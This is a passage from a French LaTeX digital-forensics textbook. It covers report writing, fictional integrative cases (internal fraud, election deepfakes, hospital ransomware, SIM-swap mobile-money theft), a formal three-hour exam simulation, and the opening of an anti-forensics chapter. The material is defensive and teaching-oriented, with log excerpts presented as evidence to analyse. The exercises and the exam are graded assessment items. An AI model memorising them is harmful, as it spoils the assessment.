inhérente à l'outil de capture est documentée dans le formulaire
de custody sous la note~: \textit{``légère modification de la RAM
inhérente au processus de capture, conformément à ACPO Principe~2''}
(Annexe~F, ligne~12). Cette modification affecte quelques kilo-octets
et n'altère pas les artefacts analysés. »

\textbf{Q3~:} ``Votre rapport dit que l'attaque vient de l'IP
185.220.XX.XX. Comment savez-vous qu'il ne s'agit pas d'un VPN
utilisé par quelqu'un d'autre~?''

\textbf{R (correcte)~:} « Je ne l'affirme pas dans mon rapport.
La page~3 indique explicitement que l'attribution de cette IP à une
personne physique est hors périmètre de cette expertise et nécessite
une réquisition aux autorités compétentes. Je constate un fait~:
l'IP source des connexions SSH. L'identification du titulaire relève
d'une démarche distincte. »
\end{boxscenario}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Trois niveaux}~: Synthèse Exécutive (2--4 pages,
          non-technicien)~; Rapport Technique (20--100 pages, technicien
          ou avocat)~; Dossier Probatoire (annexes vérifiables).
          Cohérents entre eux~; rédigés pour des audiences différentes.

    \item \textbf{La règle d'or}~: Constatation = fait vérifiable
          (horodaté, sourcé). Analyse = interprétation (niveau de
          confiance + hypothèses alternatives réfutées). Ne jamais
          mélanger. Tester chaque phrase~: ``mais si je me trompe,
          la phrase est-elle encore vraie~?''

    \item \textbf{Chaque constatation cite sa source}~: ``[Source~:
          MFTECmd, fichier \$UsnJrnl, Annexe~B]''. Toujours. Sans
          exception.

    \item \textbf{Annexe~G obligatoire}~: hash SHA-256 de toutes les
          pièces annexées. C'est la preuve de l'intégrité du dossier
          probatoire lui-même.

    \item \textbf{La qualification juridique n'appartient pas à l'expert.}
          Finir la section Analyse par~: ``La qualification juridique
          de ces faits relève de l'autorité judiciaire mandante.''

    \item \textbf{Hypothèses alternatives obligatoires}~: présenter et
          réfuter au moins une hypothèse alternative par conclusion
          majeure. Sans cette réfutation, la conclusion est une
          affirmation, pas une analyse.

    \item \textbf{Synthèse exécutive}~: zéro jargon non défini~;
          trois points maximum~; une pièce clé identifiée~;
          une référence vers le rapport technique pour approfondir.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~19.1 --- Identifier constatation vs analyse \niveaubase}]
Pour chacun des énoncés suivants, indiquez s'il s'agit d'une
Constatation, d'une Analyse, ou d'un mélange interdit~; reformulez
les mélanges~:
\begin{enumerate}[(a)]
    \item « Le fichier \texttt{malware.exe} a été exécuté par
          MBONGO le 15 janvier 2026 à 14h28. »
    \item « Le Prefetch \texttt{MALWARE.EXE-A1B2C3D4.pf} enregistre
          une exécution à 14h28:33, compteur~= 1. »
    \item « L'attaquant a tenté de couvrir ses traces en supprimant
          le fichier enc\_all.ps1. »
    \item « Le \texttt{\$UsnJrnl} enregistre la suppression du
          fichier enc\_all.ps1 à 02h18:30, soit 46~secondes après
          l'entrée \texttt{DataExtend|Close} (02h17:44). »
    \item « Les logs de connexion montrent un accès suspect
          depuis une IP russe. »
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~19.2 --- Rédiger une section Constatations \niveaumoyen}]
À partir des données suivantes (extraites des analyses MVOM),
rédigez 5~constatations correctement structurées (fait + source
+ annexe)~:
\begin{itemize}
    \item UserAssist~: \texttt{AnyDesk.exe} exécuté 3~fois,
          dernière à 02h10:15~;
    \item Volatility netscan~: connexion ESTABLISHED vers
          185.220.XX.XX:4444 à partir du PID~4892~;
    \item Volatility pslist~: PID~4892 = svchost.exe,
          PID parent~= 4888 (cmd.exe)~;
    \item \$UsnJrnl~: création de \texttt{encrypted\_files\_list.txt}
          à 02h18:31~;
    \item journald~: SSH Accepted password pour root depuis
          185.220.XX.XX à 02h14:09.
\end{itemize}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~19.3 --- Rapport complet \niveauexpert}]
Produisez le rapport forensique complet sur l'Opération MVOM
(Chapitre~\ref{chap:gr-affaires}) en appliquant toutes les
techniques de ce cours~:
\begin{enumerate}[(a)]
    \item \textbf{Synthèse Exécutive}~: 1~page maximum,
          non-technicien, trois points, une pièce clé.
    \item \textbf{Section Constatations}~: au moins 10~constatations
          couvrant~: l'accès SSH, l'exécution du ransomware,
          le chiffrement des fichiers, et la tentative de suppression
          des traces. Chaque constatation cite sa source.
    \item \textbf{Section Analyse}~: chronologie de l'incident avec
          niveau de confiance explicite~; au moins une hypothèse
          alternative présentée et réfutée (E9bis PIU).
    \item \textbf{Section Conclusions}~: réponses aux 3~questions
          du mandant~; qualification technique sans qualification
          juridique.
    \item \textbf{Plan des Annexes}~: liste les pièces à annexer
          avec leur description et leur hash attendu.
\end{enumerate}
\textit{Note~: cet exercice peut être évalué comme devoir maison.}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} La Partie~IV est terminée. Le cours dispose
maintenant de toutes les briques techniques~: investigation système,
réseau, mobile, cloud et IoT, plus la synthèse documentaire.

La \textbf{Partie~V} traite les contre-mesures~: Anti-Forensique
(techniques d'obfuscation et d'effacement~; comment les détecter),
puis les sujets avancés (OSINT, investigations spécialisées,
perspectives futures). Ces chapitres s'appuient sur la maîtrise
des techniques forensiques de la Partie~IV~--- la connaissance
de l'attaque est indissociable de la maîtrise de la défense.
\end{boxinfo}

       
        % ============================================================================
% Fichier  : partie4/P04_C20_applications_cas.tex
% Titre    : Applications et Cas Intégrateurs
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
% Sources  : M7_Cas_Pratiques_Integrateurs_PNC.docx (structure des cas)
%            Synthèse de l'ensemble du cours (Parties I à IV)
% Positionnement : Chapitre-capstone. Mobilise simultanément le PIU,
%                  le droit camerounais, les techniques d'acquisition,
%                  l'analyse système/réseau/mobile et la rédaction de rapport.
%                  Trois cas intégrateurs nouveaux + simulation d'examen.
%                  Pas de nouvelles connaissances : consolidation et
%                  application transversale.
% ============================================================================

\chapter{Applications et Cas Intégrateurs}
\label{chap:cas-int}

\epigraph{%
    « La théorie c'est quand on sait tout et que rien ne fonctionne.
    La pratique c'est quand tout fonctionne et que personne ne sait
    pourquoi. Ici, nous visons les deux. »%
}{--- Adapté d'Albert Einstein}

\niveauChapitre{Expert}{%
    Ce chapitre exige la maîtrise de l'ensemble des Parties~I à~IV.
    Il ne présente aucune notion nouvelle~; il consolide et
    intègre par la pratique.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Appliquer le PIU de bout en bout sur un cas complexe
          multi-sources et multi-juridictions.
    \item Mobiliser simultanément~: qualification juridique,
          techniques d'acquisition, analyse artefacts, corrélation
          temporelle et rédaction de rapport.
    \item Gérer les tensions CRO dans des situations de décision
          réelle sous contrainte de temps.
    \item Identifier les erreurs classiques d'investigation et
          les corriger.
    \item Se préparer à l'évaluation finale par une simulation
          complète de cas intégrateur.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Mode d'emploi de ce chapitre}
% ============================================================================

Ce chapitre fonctionne différemment des précédents~: il ne présente
pas de nouvelles techniques. Il vous place dans la position de
l'investigateur face à un cas complet, en mobilisant simultanément
tout ce que vous avez appris.

\textbf{Structure de chaque cas~:}
\begin{enumerate}
    \item \textbf{Brief initial}~: les faits tels qu'ils vous sont
          présentés (incomplets, parfois trompeurs~--- comme dans
          la réalité).
    \item \textbf{Phase d'investigation guidée}~: questions structurées
          mobilisant les différentes dimensions du cours.
    \item \textbf{Révélations progressives}~: des indices supplémentaires
          apparaissent à mesure que l'investigation avance.
    \item \textbf{Synthèse et rapport}~: production d'un livrable
          juridiquement structuré.
\end{enumerate}

\separateur

% ============================================================================
\section{Cas~1 --- Opération FAKO~: Fraude Comptable Interne}
\label{sec:cas-fako}
% ============================================================================

\subsection{Brief initial}

\begin{boxscenario}{Brief --- Opération FAKO}
\textbf{Date~:} Lundi 10~mars~2026, 09h15.

La DRH de CAMEROON AGRO~SA (exportateur de produits agricoles,
150~salariés, Buea) vous contacte en urgence. La direction a
découvert, lors de l'audit mensuel, que des virements bancaires
non autorisés totalisant \textbf{47~millions~FCFA} ont été effectués
vers des comptes inconnus entre le 1er et le 28~février~2026.

Informations disponibles~:
\begin{itemize}
    \item Les virements ont été initiés depuis le logiciel comptable
          interne (\texttt{Sage~100 Comptabilité}, serveur Windows~Server~2019)~;
    \item Trois comptes employés avaient accès au module de virements~:
          EBOA Claire (DAF), BAFUT Jonas (comptable senior),
          MBAH Inès (comptable junior)~;
    \item Aucune des trois n'a signalé d'anomalie~;
    \item MBAH Inès est en arrêt maladie depuis le 1er~mars~2026.
\end{itemize}

\textbf{Mission~:} vous êtes mandaté par le parquet suite à la plainte
de CAMEROON AGRO~SA. Identifier l'auteur des virements non autorisés.
\end{boxscenario}

\subsection{Phase~1~: Initialisation (PIU E1--E3)}

\begin{boxexo}[title={\ding{45}\quad FAKO --- Étape~1~: Cadrage}]
\begin{enumerate}[(a)]
    \item Remplissez la matrice de criticité (Tableau~6 du Ch.~PIU)
          pour cette affaire. Quel niveau de rigueur s'applique~?
    \item Quelles autorisations judiciaires devez-vous obtenir
          avant toute action technique~? Citez les articles exacts
          (\loicam{2010/012}).
    \item Listez les sources de données à collecter, dans l'ordre
          de la RFC~3227. Quelle est la première source à traiter~?
    \item Y a-t-il un risque de destruction de preuves actif~?
          Comment le gérer~?
\end{enumerate}
\end{boxexo}

\subsection{Révélation~1 --- Accès aux logs}

\begin{boiteRemarque}{Révélation~1 (disponible après l'Étape~1)}
L'administrateur système vous communique~: le serveur Sage~100 est
allumé~; les logs d'authentification Windows sont activés et conservés
sur 30~jours (Event~ID~4624/4634). La messagerie professionnelle
(Exchange) est hébergée sur Office~365 (Microsoft~365). MBAH Inès
avait accès au VPN depuis chez elle.
\end{boiteRemarque}

\subsection{Phase~2~: Acquisition et Analyse (PIU E4--E9)}

\begin{boxexo}[title={\ding{45}\quad FAKO --- Étape~2~: Investigation système}]
\begin{enumerate}[(a)]
    \item L'analyse des Event~ID~4624 (connexion réussie) sur le serveur
          Sage~100 révèle~:
\begin{lstlisting}[language=bash_forensique]
# Extrait Event Viewer -- Logon Events
[2026-02-14 02:17:43] EventID:4624 Account:MBAH_INES
                       LogonType:3 (Network)
                       SourceIP:41.202.XXX.XXX
[2026-02-14 02:17:45] EventID:4624 Account:MBAH_INES
                       LogonType:3 Source:41.202.XXX.XXX
[2026-02-21 03:05:12] EventID:4624 Account:MBAH_INES
                       LogonType:3 Source:41.202.XXX.XXX
\end{lstlisting}
          Que révèle l'heure des connexions (02h17 et 03h05)~?
          Quelle hypothèse formulez-vous~?
    \item L'IP \texttt{41.202.XXX.XXX} est localisée au Nigéria
          (Lagos). MBAH Inès est en arrêt maladie depuis le 1er~mars
          mais les connexions datent de février. Est-ce problématique~?
    \item Formulez 5~hypothèses (méthode ACH, E8 PIU). Quelle hypothèse
          est la plus cohérente avec les données actuelles~?
    \item Quelles données demandez-vous à Microsoft via le portail
          LEA pour corroborer ou réfuter~?
\end{enumerate}
\end{boxexo}

\subsection{Révélation~2 --- Résultat LEA Microsoft}

\begin{boiteRemarque}{Révélation~2}
La réponse de Microsoft (portail LEA, délai~: 5~jours) indique~:
\begin{itemize}
    \item Le compte \texttt{mbah.ines@cameroon-agro.cm} s'est connecté
          depuis l'IP \texttt{41.202.XXX.XXX} (Lagos, Nigéria) à
          02h17 le 14~février~; 1~email a été lu~: l'email de réinitialisation
          VPN envoyé par l'IT à MBAH Inès le 13~février.
    \item Le même compte s'est connecté depuis l'IP
          \texttt{196.168.XXX.XXX} (Douala, Cameroun) à 08h30
          le 14~février~--- 6~heures plus tard.
\end{itemize}
\end{boiteRemarque}

\subsection{Phase~3~: Qualification et rapport}

\begin{boxexo}[title={\ding{45}\quad FAKO --- Étape~3~: Qualification et rapport}]
\begin{enumerate}[(a)]
    \item La connexion depuis Lagos à 02h17 (accès email de réinitialisation
          VPN) suivie d'une connexion depuis Douala à 08h30 le même
          jour est-elle physiquement possible pour une personne
          se déplaçant entre les deux villes~? Quelle est l'implication
          forensique~?
    \item Qualifiez les infractions potentielles (articles Loi~2010/012
          et Loi~2024/017). Qui est susceptible d'être mis en cause~?
    \item Appliquez la grille CRO à la décision de notifier MBAH Inès
          qu'elle est suspectée avant l'obtention de son téléphone.
    \item Rédigez les 5~premières constatations de votre rapport
          (Section~3, Constatations), en citant chaque source.
\end{enumerate}
\end{boxexo}

% ============================================================================
\section{Cas~2 --- Opération MUNGO~: Trafic d'Influence en Ligne}
\label{sec:cas-mungo}
% ============================================================================

\subsection{Brief initial}

\begin{boxscenario}{Brief --- Opération MUNGO}
\textbf{Date~:} Mercredi 15~avril~2026, 14h00.

Le Service Central de Lutte contre la Cybercriminalité (SCFC) reçoit
un signalement~: une campagne coordonnée de désinformation cible un
candidat à des élections locales dans la région du Littoral. Des
centaines de faux comptes Facebook diffusent des \textit{deepfakes}
audio attribuant de fausses déclarations au candidat.

Informations disponibles~:
\begin{itemize}
    \item 347~faux comptes identifiés par les équipes de modération
          de Meta, actifs depuis le 1er~avril~2026~;
    \item Tous créés depuis des IPs dans un même sous-réseau
          (\texttt{196.200.XX.0/24}, hébergeur camerounais)~;
    \item Contenus~: 12~clips audio deepfake, 47~posts texte,
          3~faux articles de presse~;
    \item Plainte déposée par le candidat victime le 14~avril.
\end{itemize}
\end{boxscenario}

\subsection{Investigation guidée}

\begin{boxexo}[title={\ding{45}\quad MUNGO --- Investigation complète}]
\begin{enumerate}[(a)]
    \item \textbf{Cadrage juridique}~: qualifiez les infractions
          potentielles. Les deepfakes audio sont-ils couverts par
          la \loicam{2010/012}~? Par quelle disposition~?
          Quelle innovation de la \loicam{2024/017} est-elle pertinente
          (données biométriques dans les deepfakes)~?
    \item \textbf{Stratégie de conservation d'urgence}~: les faux
          comptes Facebook peuvent être supprimés par Meta en quelques
          heures (violation des conditions d'utilisation). Quelle est
          votre première action~? Rédigez la demande de conservation
          urgente (art.~29 Budapest, portail LEA Meta Emergency).
    \item \textbf{Analyse technique des deepfakes}~: les clips audio
          deepfake sont des fichiers~MP3. Quelle analyse forensique
          pouvez-vous conduire sur ces fichiers~? Quels outils~?
          Quels artefacts~? (Indice~: métadonnées EXIF audio,
          spectrogramme, détecteurs de deepfake IA).
    \item \textbf{Attribution des comptes}~: tous les comptes viennent
          du même sous-réseau \texttt{196.200.XX.0/24}. Comment
          identifier l'abonné de cet hébergeur camerounais~?
          Quelle réquisition~? Quels délais~?
    \item \textbf{Contexte électoral et urgence déontologique}~:
          l'élection a lieu dans 15~jours. Le responsable politique
          concurrent tente de vous contacter ``en privé'' pour
          ``accélérer le dossier''. Identifiez la tension déontologique
          et décrivez votre réponse (Ch.~\ref{chap:deonto}).
    \item \textbf{CRO}~: appliquez la grille CRO à la décision de
          publier l'analyse technique des deepfakes avant la fin
          de l'investigation~: qui en bénéficierait, qui en
          souffrirait~?
\end{enumerate}
\end{boxexo}

% ============================================================================
\section{Cas~3 --- Opération SANAGA~: Ransomware Hôpital}
\label{sec:cas-sanaga}
% ============================================================================

\subsection{Brief initial}

\begin{boxscenario}{Brief --- Opération SANAGA}
\textbf{Date~:} Samedi 22~mars~2026, 06h30.

L'Hôpital Général de Yaoundé subit une attaque ransomware.
Les systèmes informatiques du bloc chirurgical, de la pharmacie
et des dossiers patients sont paralysés. Des interventions
chirurgicales ont dû être reportées. Un message de rançon
exige 15~bitcoins ($\approx$~750~000~USD) dans les 48~heures.

Particularités critiques~:
\begin{itemize}
    \item Des données de santé de 12~000~patients camerounais
          ont potentiellement été exfiltrées~;
    \item Le serveur principal est sous Windows~Server~2019,
          allumé, avec le message de rançon visible à l'écran~;
    \item Deux vies sont en jeu~: un patient en soins intensifs
          dépend d'un équipement connecté au réseau compromis~;
    \item Le chef du service informatique affirme avoir ``fait
          une sauvegarde hier''~--- mais ne retrouve pas le support.
\end{itemize}
\end{boxscenario}

\subsection{Décisions critiques sous pression}

\begin{boxexo}[title={\ding{45}\quad SANAGA --- Décisions immédiate et médiate}]
\textbf{Vous arrivez sur les lieux à 07h00. Vous avez 10~minutes
pour prendre vos premières décisions.}

\begin{enumerate}[(a)]
    \item \textbf{Triage}~: le patient en soins intensifs est-il
          votre responsabilité en tant qu'investigateur~?
          Que faites-vous en priorité absolue~? Citez le cadre
          éthique (Ch.~\ref{chap:deonto}~: tension efficacité
          vs droits, ici tension investigation vs vie humaine).
    \item \textbf{Ordre de volatilité}~: le serveur est allumé
          avec le message de rançon visible. Quelle est votre
          séquence d'actions dans les 30~premières minutes~?
          (RFC~3227, Ch.~\ref{chap:meth-std}). Argumentez pourquoi
          la capture RAM précède la capture réseau dans ce contexte.
    \item \textbf{Données de santé}~: 12~000~dossiers patients
          ont potentiellement été exfiltrés. Quelles obligations
          s'appliquent à l'hôpital en vertu de la
          \loicam{2024/017}~? Quels articles~? Dans quels délais~?
          Qui doit en être informé~?
    \item \textbf{La rançon}~: le Directeur de l'hôpital vous
          demande si vous ``conseillez'' de payer la rançon.
          Que répondez-vous~? Justifiez en distinguant le rôle
          de l'investigateur, le rôle du décideur et les
          implications légales du paiement.
    \item \textbf{Investigation post-incident}~:
\begin{lstlisting}[language=bash_forensique]
# Volatility 3 -- windows.pstree (extrait)
4892  4888  WannaCryptor.exe   2026-03-22 04:17:22
  4888 4884  cmd.exe            2026-03-22 04:17:20
    4884 4880  mshta.exe        2026-03-22 04:17:15
      4880 4876  winword.exe    2026-03-22 04:16:58
\end{lstlisting}
          Analysez cette arborescence~: quelle chaîne d'infection
          suggère-t-elle~? Quelle vulnérabilité est probablement
          exploitée~? Rédigez la constatation correspondante.
    \item \textbf{Notification et coopération}~: le message de
          rançon contient une adresse Bitcoin. Tracez la démarche
          complète~: analyse blockchain, identification de l'exchange
          de sortie, demande de gel, juridictions impliquées.
\end{enumerate}
\end{boxexo}

% ============================================================================
\section{Grille d'Erreurs Classiques~: Diagnostiquer une Investigation}
\label{sec:erreurs-classiques}
% ============================================================================

\subsection{L'investigation TANGUE revisitée~: trouver les erreurs}

\begin{boxscenario}{Investigation viciée --- à corriger}
Voici le procès-verbal d'investigation de l'Opération TANGUE
(version non corrigée). Identifiez toutes les erreurs.

\textit{``Le 14~mars~2026 à 14h30, l'OPJ BITA s'est rendu au
domicile de BELLO Armand et a saisi son PC portable HP. L'OPJ
a allumé le PC pour constater les faits~; l'écran de veille
montrait un dossier nommé ``fraudes''. L'OPJ a photographié
l'écran et a éteint le PC. Le lendemain, l'OPJ a confié le PC
à l'analyste SONG pour analyse~; aucun document de transfer
n'a été rédigé. L'analyste a ouvert l'image forensique avec
Windows Explorer pour naviguer rapidement avant d'ouvrir Autopsy.
Le rapport indique~: ``l'accusé a dissimulé 127 fichiers de
preuves dans un dossier caché~; il est coupable de fraude
informatique selon art.~72.'' Les hash du disque original
sont conservés uniquement dans le fichier E01.''}}
\end{boxscenario}

\begin{boxexo}[title={\ding{45}\quad Diagnostic d'investigation viciée}]
\begin{enumerate}[(a)]
    \item Identifiez et nommez toutes les violations de procédure
          (au moins~7). Pour chacune, citez la règle violée
          (Ch.~\ref{chap:custody}, ACPO, ISO~27037).
    \item Lesquelles de ces violations rendent les preuves
          \textbf{irrecevables} devant un tribunal~? Justifiez.
    \item Lesquelles peuvent être \textbf{régularisées a posteriori}~?
          Comment~?
    \item Réécrivez le paragraphe du rapport en corrigeant les
          erreurs de rédaction (constatation vs analyse,
          qualification juridique par l'expert).
\end{enumerate}
\end{boxexo}

% ============================================================================
\section{Simulation d'Examen Intégrateur}
\label{sec:simulation-examen}
% ============================================================================

\begin{boxalert}
\textbf{Cette section constitue une évaluation formelle.}
Elle est conçue pour être utilisée en conditions d'examen (3~heures)
ou comme devoir maison complet. Toutes les réponses doivent citer
les articles de loi, les standards, les outils et les chapitres
du cours. Aucun document ni outil n'est autorisé en condition examen
sauf indication contraire du formateur.
\end{boxalert}

\begin{boxscenario}{Cas d'examen --- Opération DIBAMBA}
\textbf{Contexte~:} Le 5~mai~2026 à 23h45, le SCFC reçoit un
signalement de MTN Cameroun~: des transactions MoMo anormales
touchent 234~clients en 20~minutes. Montant total~: 68~millions~FCFA.

\textbf{Éléments techniques disponibles~:}
\begin{enumerate}
    \item Les transactions proviennent d'un seul numéro MTN
          (677~XXXXXX)~; le titulaire du numéro est EKINDI Paul,
          adresse~: Bonabéri, Douala~;
    \item Ce numéro a subi un SIM~swap à 23h30 (15~minutes avant
          les premières transactions)~;
    \item Le téléphone associé au numéro avant le swap était un
          Samsung Galaxy A32 (IMEI~: 358419XXXXXXXXX)~;
    \item Une capture réseau du réseau GSM (opération d'écoute
          légale, ordonnance N°~XXX) révèle des communications
          DATA depuis l'IMEI 358419XXXXXXXXX vers l'IP
          \texttt{41.66.XX.XX} (hébergeur OVH Paris) sur le
          port~8443 à 23h31~;
    \item L'adresse IP \texttt{41.66.XX.XX} héberge un domaine
          enregistré le 29~avril~2026~: \texttt{mtn-verification.cm}.
\end{enumerate}

\textbf{Contraintes~:}
\begin{itemize}
    \item Il est 01h00 du matin~; les opérateurs humains sont limités~;
    \item MTN Cameroun a conservé les logs de la transaction
          SIM~swap pendant 90~jours~;
    \item Le parquet de permanence peut délivrer une réquisition
          d'urgence~;
    \item Vous disposez de 2~heures avant que les logs de connexion
          de l'hébergeur OVH ne risquent d'être en rotation.
\end{itemize}
\end{boxscenario}

\begin{boxexo}[title={\ding{45}\quad Examen --- Opération DIBAMBA (3 heures)}]
\textbf{Partie~A --- Cadrage et urgences (45 minutes)}

\begin{enumerate}[(a)]
    \item Remplissez la matrice de criticité. Quel niveau de rigueur~?
    \item Listez 3~actions d'urgence (dans l'ordre) à réaliser
          dans les 30~premières minutes, avec base légale pour chacune.
    \item Rédigez la demande de conservation urgente à OVH (portail
          LEA, art.~29 Budapest / art.~57 \loicam{2010/012}).
          La France est partie à Budapest depuis 2006.
\end{enumerate}

\textbf{Partie~B --- Analyse technique (60 minutes)}

\begin{enumerate}[(a)]
    \setcounter{enumi}{3}
    \item Le SIM~swap s'est produit à 23h30. Comment cela permet-il
          à l'attaquant d'accéder aux comptes MoMo de 234~victimes~?
          Expliquez le mécanisme technique (OTP par SMS).
    \item La capture réseau montre une connexion vers le port~8443
          sur \texttt{mtn-verification.cm} (domaine enregistré
          le 29~avril). Que peut contenir cette connexion~?
          Quels filtres Wireshark utilisez-vous~?
    \item L'analyse OSINT du domaine \texttt{mtn-verification.cm}
          révèle~: registrar américain, paiement en Bitcoin,
          hébergement OVH Paris. Quelle séquence de réquisitions
          préparez-vous~?
\end{enumerate}

\textbf{Partie~C --- Qualification et rapport (75 minutes)}

\begin{enumerate}[(a)]
    \setcounter{enumi}{6}
    \item Qualifiez toutes les infractions potentielles~: pour chaque
          infraction, citez l'article exact (\loicam{2010/012},
          \loicam{2024/017}, Code pénal). Y a-t-il des infractions
          à la charge de MTN Cameroun pour la gestion du SIM~swap~?
    \item Formulez 5~constatations et 2~analyses (avec niveau de
          confiance) à partir des éléments disponibles.
    \item Rédigez la Synthèse Exécutive (Niveau~1) destinée
          au Procureur de permanence~: 1~page maximum,
          3~points, une pièce clé.
    \item \textbf{[Question bonus]} Appliquez la grille CRO à la
          décision de publier l'IP~\texttt{41.66.XX.XX} dans un
          communiqué de presse avant l'arrestation~: quelles
          tensions~? Quelle recommandation~?
\end{enumerate}
\end{boxexo}

\separateur

\begin{boxresume}
\textbf{Ce que ce chapitre vous a demandé de mobiliser simultanément~:}
\begin{itemize}
    \item \textbf{Droit camerounais}~: qualification précise des
          infractions (\loicam{2010/012}, \loicam{2024/017},
          Code pénal), règles d'articulation, sursis impossible
          (art.~89).

    \item \textbf{PIU}~: les phases E1--E17, les Quality Gates,
          la boucle itérative, la falsification active (E9bis),
          la distinction constatation/analyse.

    \item \textbf{Standards}~: RFC~3227 (ordre de volatilité),
          ISO~27037 (custody), ACPO~4~principes, NIST~SP~800-86
          (rapport).

    \item \textbf{Techniques}~: Event~ID Windows, logs SSH, Volatility
          (pstree, netscan), analyse portail LEA, conservation urgente
          art.~29 Budapest, analyse blockchain, corrélation temporelle.

    \item \textbf{Déontologie}~: tension efficacité vs vie humaine
          (SANAGA), pression politique (MUNGO), coverage d'un
          collègue (TANGUE).

    \item \textbf{Rapport}~: trois niveaux, 7~pièges, Annexe~G,
          formule de limitation de périmètre, qualification
          technique sans qualification juridique.
\end{itemize}

\textbf{Les trois leçons transversales de ce chapitre~:}
\begin{enumerate}
    \item \textbf{La conservation d'urgence prime toujours~:}
          dans FAKO, MUNGO, SANAGA et DIBAMBA, la première
          action est toujours de préserver avant que les données
          disparaissent. Aucune analyse ne compense des données
          perdues.
    \item \textbf{Les décisions techniques ont des conséquences
          déontologiques~:} le choix d'éteindre ou non un serveur
          (SANAGA) engage une responsabilité éthique au-delà de
          la technique.
    \item \textbf{Un rapport sans hash n'existe pas juridiquement~:}
          l'Annexe~G est la fondation de toute opposabilité.
          Sans elle, toutes vos analyses sont des opinions,
          pas des preuves.
\end{enumerate}
\end{boxresume}

\bigskip

\begin{boxinfo}
\textbf{Fin de la Partie~IV.} Les vingt chapitres couverts dans
ce cours (Parties~I à~IV) constituent le socle complet de la
forensique numérique au niveau master~: fondements philosophiques,
processus, standards, droit camerounais, techniques d'acquisition
et d'analyse (système, réseau, mobile, cloud, IoT), rédaction
de rapport et intégration par la pratique.

La \textbf{Partie~V} --- si elle est incluse dans votre programme
--- approfondit les sujets prospectifs~: OSINT avancé,
anti-forensique et contre-mesures, intelligence artificielle
appliquée à la forensique, et perspectives post-quantiques.
Ces chapitres s'inscrivent dans la continuité directe des
techniques maîtrisées ici.

\textit{Les affaires de ce cours~--- MBONGO, MVOM, WOURI,
ONAMBELE, BAOBAB, TANGUE, MOABI, ROUSSEAU, et les nouveaux
cas FAKO, MUNGO, SANAGA, DIBAMBA~--- sont fictives mais
construites sur des schémas d'infractions réels. Chaque
technique, chaque article de loi, chaque outil présenté est
authentique et applicable dès demain sur le terrain.}
\end{boxinfo}

     

    % ======================================================================
    % PARTIE V — ANTI-FORENSIQUE, IA ET DÉFIS ÉMERGENTS
    % Standards : SANS FOR610, MITRE ATT&CK, DFRWS 2024
    % Niveau : expert
    % ======================================================================
    \part{Anti-Forensique, IA Forensique et Défis Émergents}
    \label{part:avance}

        % ============================================================================
% Fichier  : partie5/P05_C21_anti_forensique.tex
% Titre    : Anti-Forensique et Contremesures
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
% Sources  : Synthèse Parties II-IV (timestomping Ch.14, StopLogging Ch.17,
%            factory reset Ch.18, suppression $UsnJrnl Ch.14)
%            Affaires MVOM (suppression script), ONAMBELE
% Positionnement : Premier chapitre de la Partie V. Référencé en transition
%                  par Ch.14 (timestomping), Ch.17 (StopLogging CloudTrail),
%                  Ch.18 (factory reset IoT). Ce chapitre systématise : pour
%                  chaque technique d'effacement, la contre-détection
%                  correspondante. Structure miroir des Parties II-IV.
% ============================================================================

\chapter{Anti-Forensique et Contremesures}
\label{chap:anti-for}

\epigraph{%
    « L'absence de preuve est elle-même une preuve --- à condition
    de savoir où et comment cette absence a été créée. »%
}{--- Principe de l'anti-forensique inversée}

\niveauChapitre{Expert}{%
    Maîtrise complète de la Partie~IV (Ch.~\ref{chap:for-sys}
    à~\ref{chap:rapport}) indispensable. Ce chapitre suppose la
    connaissance des artefacts normaux pour en détecter l'absence
    anormale.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Comprendre la logique de l'anti-forensique~: pourquoi
          l'effacement parfait est techniquement très difficile.
    \item Identifier les techniques d'anti-forensique système~:
          timestomping, suppression sélective de logs, wiping.
    \item Détecter les tentatives d'anti-forensique réseau~:
          désactivation de logging, usurpation, chiffrement opportuniste.
    \item Reconnaître les techniques anti-forensique mobile et IoT~:
          factory reset, suppression d'historique, applications vault.
    \item Appliquer le principe de Locard inversé~: toute tentative
          d'effacement laisse elle-même une trace.
    \item Documenter une tentative d'anti-forensique dans le rapport
          forensique de façon juridiquement opposable.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{La logique de l'anti-forensique}
% ============================================================================

Tout au long des Chapitres~\ref{chap:for-sys} à~\ref{chap:for-iot},
plusieurs scénarios ont montré des attaquants tentant d'effacer leurs
traces~: suppression du script \texttt{enc\_all.ps1} dans l'affaire MVOM
(Ch.~\ref{chap:for-sys}), \texttt{StopLogging} sur CloudTrail
(Ch.~\ref{chap:for-cloud}), tentatives de \textit{factory reset}
sur des appareils IoT (Ch.~\ref{chap:for-iot}). Dans chaque cas,
\textbf{la tentative a échoué à effacer toutes les traces}.

Ce n'est pas un hasard pédagogique~: c'est une réalité technique.
La redondance forensique (Ch.~\ref{chap:for-sys}, Tableau~14.1)
signifie qu'effacer \emph{toutes} les traces d'une action exige
de connaître et neutraliser \emph{chaque} artefact qu'elle a produit
--- une tâche d'une difficulté croissante avec la sophistication
des systèmes modernes.

\separateur

% ============================================================================
\section{Principes Généraux de l'Anti-Forensique}
\label{sec:principes-anti-for}
% ============================================================================

\subsection{Taxonomie des techniques anti-forensiques}

\begin{tableaucours}{p{3.0cm}p{3.5cm}p{5.0cm}}{%
    \tableauHeader{Catégorie} &
    \tableauHeader{Objectif} &
    \tableauHeader{Exemples}
}
\textbf{Destruction} & Éliminer la preuve définitivement &
    Wiping disque, suppression sécurisée, factory reset, destruction
    physique \\
\textbf{Obfuscation} & Rendre la preuve illisible ou non identifiable &
    Chiffrement, packing de malware, stéganographie, encodage \\
\textbf{Falsification} & Modifier la preuve pour induire en erreur &
    Timestomping, usurpation d'identité réseau, faux logs \\
\textbf{Minimisation} & Réduire la quantité de preuves produites &
